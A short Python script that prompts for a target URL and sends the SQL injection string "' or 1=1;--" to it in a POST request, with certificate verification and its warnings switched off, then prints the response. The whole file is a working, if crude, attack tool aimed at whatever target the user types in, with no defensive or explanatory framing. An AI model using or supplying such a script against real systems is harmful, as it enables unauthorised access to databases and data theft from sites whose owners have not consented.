import requests


#remove https warning
requests.packages.urllib3.disable_warnings()

def post(target):
   #payload_list={}
   attack_data="' or 1=1;--"    
   #headers = {
    #        'content-type': "application/json",
     #       'Accept': "*/*",
      #  }
        
   response = requests.post(target, data=attack_data, verify=False)
   print (response)

#Input target
target = input("Target:")


post(target)